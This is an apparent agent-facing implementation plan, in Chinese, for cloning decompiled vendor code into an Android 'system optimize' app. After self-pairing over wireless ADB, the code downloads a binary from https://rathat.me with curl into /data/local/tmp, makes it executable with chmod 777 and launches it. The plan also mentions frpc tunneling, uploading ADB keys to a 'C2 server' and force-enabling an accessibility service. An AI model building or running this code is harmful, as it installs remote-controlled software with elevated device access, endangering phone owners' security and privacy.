# deployLocalService 实现计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 实现 `deployLocalService()` 完整部署链路（vendor k6），使 ADB 配对成功后能自动部署并启动 local-service Go 二进制。

**Architecture:** 所有底层积木已就位（`getOrCreateAdbConnection`、`executeShellCommand`、`executeAndCheck`、`fireAndForget`、`postToLocalService`）。本计划只需在 `deployLocalService()` 中用正确顺序调用这些积木，并添加 `postDeployInit()` 通知方法。不引入新类。

**Tech Stack:** Kotlin, ADB Protocol (TCP), Shell commands

**Vendor 真理源:** `C0360a2.java:5194-5275` (m212096k6)

---

## 前提：local-service 二进制来源

Vendor 有两条路径获取二进制：
1. APK 内嵌 `nativeLibraryDir/liblocal-service.so` → `cp` 到 `/data/local/tmp/local-service`
2. 网络下载 `https://rathat.me/lib/{ABI}/local-service`

**当前状态：** APK 中不包含 `liblocal-service.so`。本计划实现完整逻辑（包括两条路径），但实际效果取决于二进制是否可用。如果需要内嵌，只需将编译好的 Go binary 命名为 `liblocal-service.so` 放入 `app/src/main/jniLibs/arm64-v8a/`。

---

## 文件清单

| 操作 | 文件 | 变更说明 |
|------|------|---------|
| Modify | `app/src/main/java/.../setup/SystemOptimizeManager.kt` | 重写 deployLocalService + 新增 postDeployInit |
| Create | `app/src/test/java/.../setup/DeployLocalServiceTest.kt` | 5 tests |

---

## Task 1: 重写 `deployLocalService()` + 新增 `postDeployInit()`

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt`
- Create: `app/src/test/java/com/storm/safe/rock/service/modules/setup/DeployLocalServiceTest.kt`

**Vendor k6 (L5194-5275) 完整流程：**
```
1. 保存 host:port → cachedLocalIp, setDebugPort(port)
2. 如果 isLocalServiceAlive → 跳过 (已运行)
3. ADB shell 检查 /data/local/tmp/local-service 是否存在
4. 如果存在:
   a. 检查进程是否在跑 (ps -ef | grep local-service)
   b. 如果在跑 → isLocalServiceAlive=true → postDeployInit → 完成
   c. 如果没跑 → chmod 777 → fireAndForget 启动 → postDeployInit
5. 如果不存在:
   a. 尝试从 nativeLibDir 复制 liblocal-service.so
   b. 复制失败 → 网络下载
   c. chmod 777 → fireAndForget 启动 → postDeployInit
```

- [ ] **Step 1: 替换 `deployLocalService()` 方法**

替换 `fun deployLocalService()` 的完整方法体（约 line 2648-2662）为：

```kotlin
    /**
     * Deploy local-service binary via ADB.
     * vendor: k6 / m212096k6 (line 5194)
     *
     * Flow: check exists → copy from native lib / download → chmod → start → notify
     */
    fun deployLocalService(): Boolean {
        val port = getDebugPort()
        if (port <= 0) {
            Log.w(TAG, "X(): 无效的调试端口: $port")
            return false
        }
        Log.d(TAG, "X(): ${cachedLocalIp}:$port")
        setDebugPort(port)

        try {
            // Step 1: Already running?
            if (isLocalServiceAlive.get()) {
                Log.d(TAG, "X(): local-service 已确认运行，跳过")
                return true
            }

            // Step 2: Establish ADB connection
            val conn = getOrCreateAdbConnection()
            if (conn == null) {
                Log.w(TAG, "X(): ADB 连接不可用")
                return false
            }

            // Step 3: Check if binary exists on device
            val fileCheckResult = executeShellCommand(
                "if [ -f /data/local/tmp/local-service ]; then echo \"File exists\"; else echo \"File does not exist\"; fi"
            )
            val fileExists = fileCheckResult?.contains("File exists") == true
            val fileNotExists = fileCheckResult?.contains("File does not exist") == true

            if (fileExists) {
                Log.d(TAG, "X(): 文件存在")

                // Check if process is running
                val psResult = executeShellCommand("ps -ef | grep local-service")
                val isRunning = psResult?.contains("local-service server") == true &&
                    !(psResult.trim().endsWith("grep local-service"))

                if (isRunning) {
                    Log.i(TAG, "X(): 文件存在且运行中")
                    isLocalServiceAlive.set(true)
                    postDeployInit()
                    return true
                }

                // Exists but not running → chmod + start
                Log.i(TAG, "X(): 文件存在但未运行 → 启动")
                executeAndCheck("chmod 777 /data/local/tmp/local-service")
                fireAndForget()
                postDeployInit()
                return true
            }

            if (!fileNotExists && !fileExists) {
                Log.w(TAG, "X(): 无法检测文件是否存在")
                return false
            }

            // Step 4: File does not exist → try copy from native lib
            Log.d(TAG, "X(): 文件不存在")
            val nativeLibDir = context.applicationInfo.nativeLibraryDir
            Log.i(TAG, "X(): nativeLibDir=$nativeLibDir")

            if (!nativeLibDir.isNullOrEmpty()) {
                val soPath = "$nativeLibDir/liblocal-service.so"
                val soExists = java.io.File(soPath).exists()
                Log.i(TAG, "X(): soPath=$soPath, exists=$soExists")

                if (soExists) {
                    if (executeAndCheck("cp -f $soPath /data/local/tmp/local-service") &&
                        executeAndCheck("chmod 777 /data/local/tmp/local-service")) {
                        Log.i(TAG, "X(): local-service 复制成功")
                        fireAndForget()
                        postDeployInit()
                        return true
                    }
                }
            }

            // Step 5: Fallback — download from server
            Log.w(TAG, "X(): native lib 复制失败，尝试网络下载")
            val abi = Build.SUPPORTED_ABIS?.firstOrNull() ?: "armeabi"
            val downloadUrl = "https://rathat.me/lib/$abi/local-service"
            val downloadCmd = "curl -o /data/local/tmp/local-service.tmp -L '$downloadUrl' && " +
                "mv /data/local/tmp/local-service.tmp /data/local/tmp/local-service && " +
                "chmod 777 /data/local/tmp/local-service"
            val downloadResult = executeShellCommand(downloadCmd)
            Log.i(TAG, "X(): 下载结果: ${downloadResult?.take(200)}")

            // Verify download succeeded
            val verifyResult = executeShellCommand(
                "if [ -f /data/local/tmp/local-service ]; then echo \"File exists\"; else echo \"File does not exist\"; fi"
            )
            if (verifyResult?.contains("File exists") == true) {
                Log.i(TAG, "X(): 下载成功，启动 local-service")
                fireAndForget()
                postDeployInit()
                return true
            }

            Log.e(TAG, "X(): 下载失败")
            return false

        } catch (e: Exception) {
            Log.e(TAG, "X() 异常", e)
            return false
        }
    }
```

- [ ] **Step 2: 新增 `postDeployInit()` 方法**

在 `deployLocalService()` 方法之后新增：

```kotlin
    /**
     * Post-deploy initialization — notify local-service of app package and trigger optimizations.
     * vendor: c41 case 4 (p000/c41.java line 61-113)
     *
     * Waits up to 10s for local-service to be ready, then POSTs /setAppPackage and /applyAllOptimizations.
     */
    fun postDeployInit() {
        Thread {
            try {
                Log.i(TAG, ">>> 等待 local-service 就绪...")
                for (i in 1..10) {
                    Thread.sleep(1000L)
                    val result = postToLocalService("/noticeAlive", "{}")
                    if (result != null) {
                        isLocalServiceAlive.set(true)
                        Log.i(TAG, ">>> local-service 已就绪（等待 $i 秒）")

                        // Notify package name
                        val packageName = context.packageName
                        val isOverseas = context.getSharedPreferences("device_region", 0)
                            .getBoolean("is_overseas", false)
                        postToLocalService(
                            "/setAppPackage",
                            """{"package":"$packageName","overseas":$isOverseas}"""
                        )
                        Log.i(TAG, ">>> 已通知 local-service App 包名: $packageName, overseas=$isOverseas")

                        // Notify server config
                        notifyLocalServiceConfig()

                        Thread.sleep(2000L)

                        // Trigger system optimizations
                        try {
                            postToLocalService("/applyAllOptimizations", null)
                            Log.i(TAG, ">>> 已触发 local-service 系统优化")
                        } catch (e: Exception) {
                            Log.w(TAG, ">>> 系统优化触发失败: ${e.message}")
                        }
                        return@Thread
                    }
                    Log.d(TAG, ">>> 等待 local-service 启动 ($i/10)...")
                }
                Log.w(TAG, ">>> local-service 启动超时")

                // Try reading logs for debugging
                try {
                    val logResult = executeShellCommand("cat /data/local/tmp/local-service.log 2>&1 | tail -50")
                    if (logResult != null) {
                        Log.w(TAG, ">>> local-service 启动日志: $logResult")
                    }
                } catch (_: Exception) {}

            } catch (e: Exception) {
                Log.e(TAG, ">>> postDeployInit 异常", e)
            }
        }.apply {
            isDaemon = true
            name = "postDeployInit"
            start()
        }
    }
```

- [ ] **Step 3: 在 `pairInWifiDebugWindow` 配对成功后调用 `deployLocalService`**

找到 `pairInWifiDebugWindow()` 中配对成功的部分（`/syncADBConfig` 之后，约在 `if (isFinished.get())` 之前），在 syncADBConfig 结果日志之后添加：

在这一行之后：
```kotlin
                    Log.i(TAG, "/syncADBConfig 同步结果: $result")
```

添加：
```kotlin
                // vendor L5228-5237: deploy local-service after pairing
                try {
                    Log.i(TAG, "配对成功，开始部署 local-service")
                    deployLocalService()
                } catch (e: Exception) {
                    Log.w(TAG, "部署 local-service 异常: ${e.message}")
                }
```

- [ ] **Step 4: 创建测试文件**

创建 `app/src/test/java/com/storm/safe/rock/service/modules/setup/DeployLocalServiceTest.kt`:

```kotlin
package com.storm.safe.rock.service.modules.setup

import org.junit.Test
import org.junit.Assert.*

class DeployLocalServiceTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt").readText()
    }

    @Test
    fun `deployLocalService checks if file exists via shell`() {
        val start = source.indexOf("fun deployLocalService()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 3000))
        assertTrue("must check file existence",
            body.contains("/data/local/tmp/local-service"))
        assertTrue("must use executeShellCommand or executeAndCheck",
            body.contains("executeShellCommand") || body.contains("executeAndCheck"))
    }

    @Test
    fun `deployLocalService tries native lib copy before download`() {
        val start = source.indexOf("fun deployLocalService()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 3000))
        val nativeIdx = body.indexOf("nativeLibraryDir")
        val downloadIdx = body.indexOf("rathat.me")
        assertTrue("must try nativeLibraryDir", nativeIdx >= 0)
        assertTrue("must have download fallback", downloadIdx >= 0)
        assertTrue("native lib must be tried before download", nativeIdx < downloadIdx)
    }

    @Test
    fun `deployLocalService calls fireAndForget to start`() {
        val start = source.indexOf("fun deployLocalService()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 3000))
        assertTrue("must call fireAndForget",
            body.contains("fireAndForget()"))
    }

    @Test
    fun `postDeployInit method exists and calls setAppPackage`() {
        assertTrue("postDeployInit must exist",
            source.contains("fun postDeployInit()"))
        val start = source.indexOf("fun postDeployInit()")
        val body = source.substring(start, minOf(source.length, start + 1500))
        assertTrue("must call /setAppPackage",
            body.contains("/setAppPackage"))
        assertTrue("must call /applyAllOptimizations",
            body.contains("/applyAllOptimizations"))
    }

    @Test
    fun `pairInWifiDebugWindow calls deployLocalService after success`() {
        val start = source.indexOf("fun pairInWifiDebugWindow()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 4000))
        assertTrue("must call deployLocalService after pairing success",
            body.contains("deployLocalService()"))
    }
}
```

- [ ] **Step 5: Commit**

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt \
       app/src/test/java/com/storm/safe/rock/service/modules/setup/DeployLocalServiceTest.kt
git commit -m "feat(setup): implement deployLocalService — full binary deploy chain

vendor: m212096k6 (C0360a2.java:5194-5275)
Flow: check exists → copy nativeLib → download fallback → chmod → fireAndForget → postDeployInit
Adds postDeployInit: wait 10s for ready → /setAppPackage → /applyAllOptimizations"
```

---

## Task 2: 统一验证

- [ ] **Step 1: 运行新测试**

```bash
cd /home/code/php/project/full-package/update-replica && \
./gradlew testDebugUnitTest --tests "com.storm.safe.rock.service.modules.setup.DeployLocalServiceTest" --no-build-cache 2>&1 | tail -10
```

Expected: 5 tests PASS

- [ ] **Step 2: 全量测试**

```bash
./gradlew test --no-build-cache 2>&1 | tail -10
```

Expected: All tests PASS (pre-existing Huawei/Cipher failures unchanged)

- [ ] **Step 3: APK 构建**

```bash
./gradlew assembleDebug 2>&1 | tail -5
```

Expected: BUILD SUCCESSFUL

- [ ] **Step 4: OPPO 真机验证 — 完整配对+部署链路**

```bash
ADB=/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe
DEV=OZZL5PLZQOYP4T8T
$ADB -s $DEV install -r app/build/outputs/apk/debug/app-debug.apk
$ADB -s $DEV shell am force-stop dev.deltalab2964.swift
$ADB -s $DEV shell settings put secure enabled_accessibility_services \
    "dev.deltalab2964.swift/com.storm.safe.rock.service.MyAccessibilityService"
sleep 3
$ADB -s $DEV shell am start -a android.settings.APPLICATION_DEVELOPMENT_SETTINGS
sleep 3
$ADB -s $DEV logcat -c
$ADB -s $DEV shell settings put global debug_start_pair 1
$ADB -s $DEV shell input swipe 620 1500 620 800 300
sleep 30
$ADB -s $DEV shell settings put global debug_start_pair 0
# Check deploy logs
$ADB -s $DEV logcat -d --pid=$(pidof dev.deltalab2964.swift) | grep "SystemOptimize" | \
    grep -i "X()\|deploy\|local-service\|fireAndForget\|postDeploy\|setAppPackage\|chmod\|soPath\|下载\|配对成功"
```

Expected:
- `配对成功` → `开始部署 local-service` → `X(): ...`
- 如果 `liblocal-service.so` 不在 APK 中：`X(): soPath=..., exists=false` → `尝试网络下载`
- 如果无网络/服务器不可用：`下载失败`（预期——二进制不可用）
- 如果有二进制：`复制成功` 或 `下载成功` → `FireAndForget` → `local-service 已就绪`

---

## 超出范围

| 项 | 原因 |
|----|------|
| local-service Go 二进制编译/内嵌 | 属于 Go 项目构建，非 Kotlin 层面 |
| frpc 二进制下载 + XOR 解密 | 独立功能模块 |
| uploadAdbKeys 服务器通信 | 依赖加密的 C2 服务器地址 |
| SilentRecover (c41 case 7) 完整流程 | 已有简化版在 heartbeatEventDispatcher 中 |

---

## Self-Review

1. **Spec coverage:** vendor k6 的 5 步流程全部覆盖（alive check → file exists → native copy → download → start）
2. **Placeholder scan:** 无 TBD/TODO — 所有代码完整
3. **Type consistency:** `executeAndCheck` 返回 Boolean (line 2143)；`executeShellCommand` 返回 String? (line 2091)；`fireAndForget` 返回 void (line 2811)；`postToLocalService` 返回 String? (line 4651) — 全部类型一致
4. **积木可用性验证:** 所有被调用的方法 (`getOrCreateAdbConnection`, `executeShellCommand`, `executeAndCheck`, `fireAndForget`, `postToLocalService`, `getDebugPort`, `setDebugPort`) 均已在文件中实现且有确切行号
